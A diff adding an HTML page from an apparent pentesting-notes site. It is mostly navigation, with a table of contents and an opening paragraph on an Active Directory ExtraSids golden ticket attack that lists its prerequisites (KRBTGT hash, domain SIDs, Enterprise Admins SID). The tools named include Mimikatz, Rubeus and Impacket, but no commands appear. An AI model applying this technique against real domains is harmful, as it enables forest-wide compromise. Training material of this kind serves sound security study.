+      <a href="../../groups/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Security Groups
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../kerberoast/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kerberoast
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_5" checked>
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Attacking Domain Trusts
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4_2_5" id="__nav_4_2_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            Attacking Domain Trusts
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Golden Ticket Attack
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Golden Ticket Attack
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#extrasids-attack-mimikatz" class="md-nav__link">
+    <span class="md-ellipsis">
+      ExtraSids Attack - Mimikatz
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="ExtraSids Attack - Mimikatz">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#obtaining-the-krbtgt-accounts-nt-hash-using-mimikatz" class="md-nav__link">
+    <span class="md-ellipsis">
+      Obtaining the KRBTGT Account's NT Hash using Mimikatz
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-get-domainsid" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Get-DomainSID
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#obtaining-enterprise-admins-groups-sid-using-get-domaingroup" class="md-nav__link">
+    <span class="md-ellipsis">
+      Obtaining Enterprise Admins Group's SID using Get-DomainGroup
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-ls-to-confirm-no-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using ls to Confirm No Access
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#creating-a-golden-ticket-with-mimikatz" class="md-nav__link">
+    <span class="md-ellipsis">
+      Creating a Golden Ticket with Mimikatz
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#confirming-a-kerberos-ticket-is-in-memory-using-klist" class="md-nav__link">
+    <span class="md-ellipsis">
+      Confirming a Kerberos Ticket is in Memory Using klist
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#listing-the-entire-c-drive-of-the-domain-controller" class="md-nav__link">
+    <span class="md-ellipsis">
+      Listing the Entire C: Drive of the Domain Controller
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#extrasids-attack-rubeus" class="md-nav__link">
+    <span class="md-ellipsis">
+      ExtraSids Attack - Rubeus
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="ExtraSids Attack - Rubeus">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#creating-a-golden-ticket-using-rubeus" class="md-nav__link">
+    <span class="md-ellipsis">
+      Creating a Golden Ticket using Rubeus
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#performing-a-dcsync-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Performing a DCSync Attack
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#extrasids-attack-linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      ExtraSids Attack - Linux
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="ExtraSids Attack - Linux">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#performing-dcsync-with-secretsdumppy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Performing DCSync with secretsdump.py
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#performing-sid-brute-forcing-using-lookupsidpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Performing SID Brute Forcing using lookupsid.py
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#grabbing-the-domain-sid-attaching-to-enterprise-admins-rid" class="md-nav__link">
+    <span class="md-ellipsis">
+      Grabbing the Domain SID &amp; Attaching to Enterprise Admin's RID
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#constructing-a-golden-ticket-using-ticketerpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Constructing a Golden Ticket using ticketer.py
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#setting-the-krb5ccname-environment-variable" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setting the KRB5CCNAME Environment Variable
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#getting-a-system-shell-using-impackets-psexecpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Getting a SYSTEM shell using Impacket's psexec.py
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#performing-the-attack-with-raisechildpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Performing the Attack with raiseChild.py
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_3" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../linux/" class="md-nav__link ">
+              
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12.504 0c-.155 0-.315.008-.48.021-4.226.333-3.105 4.807-3.17 6.298-.076 1.092-.3 1.953-1.05 3.02-.885 1.051-2.127 2.75-2.716 4.521-.278.832-.41 1.684-.287 2.489a.424.424 0 0 0-.11.135c-.26.268-.45.6-.663.839-.199.199-.485.267-.797.4-.313.136-.658.269-.864.68-.09.189-.136.394-.132.602 0 .199.027.4.055.536.058.399.116.728.04.97-.249.68-.28 1.145-.106 1.484.174.334.535.47.94.601.81.2 1.91.135 2.774.6.926.466 1.866.67 2.616.47.526-.116.97-.464 1.208-.946.587-.003 1.23-.269 2.26-.334.699-.058 1.574.267 2.577.2.025.134.063.198.114.333l.003.003c.391.778 1.113 1.132 1.884 1.071.771-.06 1.592-.536 2.257-1.306.631-.765 1.683-1.084 2.378-1.503.348-.199.629-.469.649-.853.023-.4-.2-.811-.714-1.376v-.097l-.003-.003c-.17-.2-.25-.535-.338-.926-.085-.401-.182-.786-.492-1.046h-.003c-.059-.054-.123-.067-.188-.135a.357.357 0 0 0-.19-.064c.431-1.278.264-2.55-.173-3.694-.533-1.41-1.465-2.638-2.175-3.483-.796-1.005-1.576-1.957-1.56-3.368.026-2.152.236-6.133-3.544-6.139zm.529 3.405h.013c.213 0 .396.062.584.198.19.135.33.332.438.533.105.259.158.459.166.724 0-.02.006-.04.006-.06v.105a.086.086 0 0 1-.004-.021l-.004-.024a1.807 1.807 0 0 1-.15.706.953.953 0 0 1-.213.335.71.71 0 0 0-.088-.042c-.104-.045-.198-.064-.284-.133a1.312 1.312 0 0 0-.22-.066c.05-.06.146-.133.183-.198.053-.128.082-.264.088-.402v-.02a1.21 1.21 0 0 0-.061-.4c-.045-.134-.101-.2-.183-.333-.084-.066-.167-.132-.267-.132h-.016c-.093 0-.176.03-.262.132a.8.8 0 0 0-.205.334 1.18 1.18 0 0 0-.09.4v.019c.002.089.008.179.02.267-.193-.067-.438-.135-.607-.202a1.635 1.635 0 0 1-.018-.2v-.02a1.772 1.772 0 0 1 .15-.768 1.08 1.08 0 0 1 .43-.533.985.985 0 0 1 .594-.2zm-2.962.059h.036c.142 0 .27.048.399.135.146.129.264.288.344.465.09.199.14.4.153.667v.004c.007.134.006.2-.002.266v.08c-.03.007-.056.018-.083.024-.152.055-.274.135-.393.2.012-.09.013-.18.003-.267v-.015c-.012-.133-.04-.2-.082-.333a.613.613 0 0 0-.166-.267.248.248 0 0 0-.183-.064h-.021c-.071.006-.13.04-.186.132a.552.552 0 0 0-.12.27.944.944 0 0 0-.023.33v.015c.012.135.037.2.08.334.046.134.098.2.166.268.01.009.02.018.034.024-.07.057-.117.07-.176.136a.304.304 0 0 1-.131.068 2.62 2.62 0 0 1-.275-.402 1.772 1.772 0 0 1-.155-.667 1.759 1.759 0 0 1 .08-.668 1.43 1.43 0 0 1 .283-.535c.128-.133.26-.2.418-.2zm1.37 1.706c.332 0 .733.065 1.216.399.293.2.523.269 1.052.468h.003c.255.136.405.266.478.399v-.131a.571.571 0 0 1 .016.47c-.123.31-.516.643-1.063.842v.002c-.268.135-.501.333-.775.465-.276.135-.588.292-1.012.267a1.139 1.139 0 0 1-.448-.067 3.566 3.566 0 0 1-.322-.198c-.195-.135-.363-.332-.612-.465v-.005h-.005c-.4-.246-.616-.512-.686-.71-.07-.268-.005-.47.193-.6.224-.135.38-.271.483-.336.104-.074.143-.102.176-.131h.002v-.003c.169-.202.436-.47.839-.601.139-.036.294-.065.466-.065zm2.8 2.142c.358 1.417 1.196 3.475 1.735 4.473.286.534.855 1.659 1.102 3.024.156-.005.33.018.513.064.646-1.671-.546-3.467-1.089-3.966-.22-.2-.232-.335-.123-.335.59.534 1.365 1.572 1.646 2.757.13.535.16 1.104.021 1.67.067.028.135.06.205.067 1.032.534 1.413.938 1.23 1.537v-.043c-.06-.003-.12 0-.18 0h-.016c.151-.467-.182-.825-1.065-1.224-.915-.4-1.646-.336-1.77.465-.008.043-.013.066-.018.135-.068.023-.139.053-.209.064-.43.268-.662.669-.793 1.187-.13.533-.17 1.156-.205 1.869v.003c-.02.334-.17.838-.319 1.35-1.5 1.072-3.58 1.538-5.348.334a2.645 2.645 0 0 0-.402-.533 1.45 1.45 0 0 0-.275-.333c.182 0 .338-.03.465-.067a.615.615 0 0 0 .314-.334c.108-.267 0-.697-.345-1.163-.345-.467-.931-.995-1.788-1.521-.63-.4-.986-.87-1.15-1.396-.165-.534-.143-1.085-.015-1.645.245-1.07.873-2.11 1.274-2.763.107-.065.037.135-.408.974-.396.751-1.14 2.497-.122 3.854a8.123 8.123 0 0 1 .647-2.876c.564-1.278 1.743-3.504 1.836-5.268.048.036.217.135.289.202.218.133.38.333.59.465.21.201.477.335.876.335.039.003.075.006.11.006.412 0 .73-.134.997-.268.29-.134.52-.334.74-.4h.005c.467-.135.835-.402 1.044-.7zm2.185 8.958c.037.6.343 1.245.882 1.377.588.134 1.434-.333 1.791-.765l.211-.01c.315-.007.577.01.847.268l.003.003c.208.199.305.53.391.876.085.4.154.78.409 1.066.486.527.645.906.636 1.14l.003-.007v.018l-.003-.012c-.015.262-.185.396-.498.595-.63.401-1.746.712-2.457 1.57-.618.737-1.37 1.14-2.036 1.191-.664.053-1.237-.2-1.574-.898l-.005-.003c-.21-.4-.12-1.025.056-1.69.176-.668.428-1.344.463-1.897.037-.714.076-1.335.195-1.814.12-.465.308-.797.641-.984l.045-.022zm-10.814.049h.01c.053 0 .105.005.157.014.376.055.706.333 1.023.752l.91 1.664.003.003c.243.533.754 1.064 1.189 1.637.434.598.77 1.131.729 1.57v.006c-.057.744-.48 1.148-1.125 1.294-.645.135-1.52.002-2.395-.464-.968-.536-2.118-.469-2.857-.602-.369-.066-.61-.2-.723-.4-.11-.2-.113-.602.123-1.23v-.004l.002-.003c.117-.334.03-.752-.027-1.118-.055-.401-.083-.71.043-.94.16-.334.396-.4.69-.533.294-.135.64-.202.915-.47h.002v-.002c.256-.268.445-.601.668-.838.19-.201.38-.336.663-.336zm7.159-9.074c-.435.201-.945.535-1.488.535-.542 0-.97-.267-1.28-.466-.154-.134-.28-.268-.373-.335-.164-.134-.144-.333-.074-.333.109.016.129.134.199.2.096.066.215.2.36.333.292.2.68.467 1.167.467.485 0 1.053-.267 1.398-.466.195-.135.445-.334.648-.467.156-.136.149-.267.279-.267.128.016.034.134-.147.332a8.097 8.097 0 0 1-.69.468zm-1.082-1.583V5.64c-.006-.02.013-.042.029-.05.074-.043.18-.027.26.004.063 0 .16.067.15.135-.006.049-.085.066-.135.066-.055 0-.092-.043-.141-.068-.052-.018-.146-.008-.163-.065zm-.551 0c-.02.058-.113.049-.166.066-.047.025-.086.068-.14.068-.05 0-.13-.02-.136-.068-.01-.066.088-.133.15-.133.08-.031.184-.047.259-.005.019.009.036.03.03.05v.02h.003z"/></svg>
+  
+  <span class="md-ellipsis">
+    Linux
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            Linux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_4" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../pwn/" class="md-nav__link ">
+              
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="M4 1.75C4 .784 4.784 0 5.75 0h5.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v8.586A1.75 1.75 0 0 1 14.25 15h-9a.75.75 0 0 1 0-1.5h9a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 10 4.25V1.5H5.75a.25.25 0 0 0-.25.25v2a.75.75 0 0 1-1.5 0Zm-4 6C0 6.784.784 6 1.75 6h1.5C4.216 6 5 6.784 5 7.75v2.5A1.75 1.75 0 0 1 3.25 12h-1.5A1.75 1.75 0 0 1 0 10.25ZM6.75 6h1.5a.75.75 0 0 1 .75.75v3.75h.75a.75.75 0 0 1 0 1.5h-3a.75.75 0 0 1 0-1.5h.75v-3h-.75a.75.75 0 0 1 0-1.5Zm-5 1.5a.25.25 0 0 0-.25.25v2.5c0 .138.112.25.25.25h1.5a.25.25 0 0 0 .25-.25v-2.5a.25.25 0 0 0-.25-.25Zm9.75-5.938V4.25c0 .138.112.25.25.25h2.688l-.011-.013-2.914-2.914-.013-.011Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Pwn
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_4">
+            <span class="md-nav__icon md-icon"></span>
+            Pwn
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_5" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../web/" class="md-nav__link ">
+              
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M16.36 14c.08-.66.14-1.32.14-2 0-.68-.06-1.34-.14-2h3.38c.16.64.26 1.31.26 2s-.1 1.36-.26 2m-5.15 5.56c.6-1.11 1.06-2.31 1.38-3.56h2.95a8.03 8.03 0 0 1-4.33 3.56M14.34 14H9.66c-.1-.66-.16-1.32-.16-2 0-.68.06-1.35.16-2h4.68c.09.65.16 1.32.16 2 0 .68-.07 1.34-.16 2M12 19.96c-.83-1.2-1.5-2.53-1.91-3.96h3.82c-.41 1.43-1.08 2.76-1.91 3.96M8 8H5.08A7.923 7.923 0 0 1 9.4 4.44C8.8 5.55 8.35 6.75 8 8m-2.92 8H8c.35 1.25.8 2.45 1.4 3.56A8.008 8.008 0 0 1 5.08 16m-.82-2C4.1 13.36 4 12.69 4 12s.1-1.36.26-2h3.38c-.08.66-.14 1.32-.14 2 0 .68.06 1.34.14 2M12 4.03c.83 1.2 1.5 2.54 1.91 3.97h-3.82c.41-1.43 1.08-2.77 1.91-3.97M18.92 8h-2.95a15.65 15.65 0 0 0-1.38-3.56c1.84.63 3.37 1.9 4.33 3.56M12 2C6.47 2 2 6.5 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Web
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4_5" id="__nav_4_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_5">
+            <span class="md-nav__icon md-icon"></span>
+            Web
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/abusing-no-redirects/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Abusing No Redirects
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/cypher-injection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cypher Injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_6" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../windows/" class="md-nav__link ">
+              
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 3.449 9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>
+  
+  <span class="md-ellipsis">
+    Windows
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_6">
+            <span class="md-nav__icon md-icon"></span>
+            Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../tutorials/" class="md-nav__link ">
+              
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 17a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2H9.46c.35.61.54 1.3.54 2h10v11h-9v2m4-10v2H9v13H7v-6H5v6H3v-8H1.5V9a2 2 0 0 1 2-2H15M8 4a2 2 0 0 1-2 2 2 2 0 0 1-2-2 2 2 0 0 1 2-2 2 2 0 0 1 2 2Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Tutorials
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            Tutorials
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../tutorials/github-pages-with-obsidian/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    GitHub Pages with Obsidian
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../tutorials/how-to-bloodhound/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    How to BloodHound
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../tutorials/how-to-buffer-overflow/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    How to Buffer Overflow
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../tutorials/how-to-burp-suite/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    How to Burp Suite
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../tutorials/how-to-pivoting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    How to Pivoting
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#extrasids-attack-mimikatz" class="md-nav__link">
+    <span class="md-ellipsis">
+      ExtraSids Attack - Mimikatz
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="ExtraSids Attack - Mimikatz">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#obtaining-the-krbtgt-accounts-nt-hash-using-mimikatz" class="md-nav__link">
+    <span class="md-ellipsis">
+      Obtaining the KRBTGT Account's NT Hash using Mimikatz
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-get-domainsid" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Get-DomainSID
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#obtaining-enterprise-admins-groups-sid-using-get-domaingroup" class="md-nav__link">
+    <span class="md-ellipsis">
+      Obtaining Enterprise Admins Group's SID using Get-DomainGroup
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-ls-to-confirm-no-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using ls to Confirm No Access
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#creating-a-golden-ticket-with-mimikatz" class="md-nav__link">
+    <span class="md-ellipsis">
+      Creating a Golden Ticket with Mimikatz
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#confirming-a-kerberos-ticket-is-in-memory-using-klist" class="md-nav__link">
+    <span class="md-ellipsis">
+      Confirming a Kerberos Ticket is in Memory Using klist
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#listing-the-entire-c-drive-of-the-domain-controller" class="md-nav__link">
+    <span class="md-ellipsis">
+      Listing the Entire C: Drive of the Domain Controller
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#extrasids-attack-rubeus" class="md-nav__link">
+    <span class="md-ellipsis">
+      ExtraSids Attack - Rubeus
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="ExtraSids Attack - Rubeus">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#creating-a-golden-ticket-using-rubeus" class="md-nav__link">
+    <span class="md-ellipsis">
+      Creating a Golden Ticket using Rubeus
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#performing-a-dcsync-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Performing a DCSync Attack
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#extrasids-attack-linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      ExtraSids Attack - Linux
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="ExtraSids Attack - Linux">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#performing-dcsync-with-secretsdumppy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Performing DCSync with secretsdump.py
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#performing-sid-brute-forcing-using-lookupsidpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Performing SID Brute Forcing using lookupsid.py
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#grabbing-the-domain-sid-attaching-to-enterprise-admins-rid" class="md-nav__link">
+    <span class="md-ellipsis">
+      Grabbing the Domain SID &amp; Attaching to Enterprise Admin's RID
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#constructing-a-golden-ticket-using-ticketerpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Constructing a Golden Ticket using ticketer.py
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#setting-the-krb5ccname-environment-variable" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setting the KRB5CCNAME Environment Variable
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#getting-a-system-shell-using-impackets-psexecpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Getting a SYSTEM shell using Impacket's psexec.py
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#performing-the-attack-with-raisechildpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Performing the Attack with raiseChild.py
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  <h1>Golden Ticket Attack</h1>
+
+<h2 id="extrasids-attack-mimikatz">ExtraSids Attack - Mimikatz</h2>
+<p>To perform this attack after compromising a child domain, we need the following:</p>
+<ul>
+<li>The KRBTGT hash for the child domain</li>
+<li>The SID for the child domain</li>
+<li>The name of a target user in the child domain (does not need to exist!)</li>
+<li>The FQDN of the child domain.</li>
+<li>The SID of the Enterprise Admins group of the root domain.</li>
+<li>With this data collected, the attack can be performed with Mimikatz.</li>
+</ul>
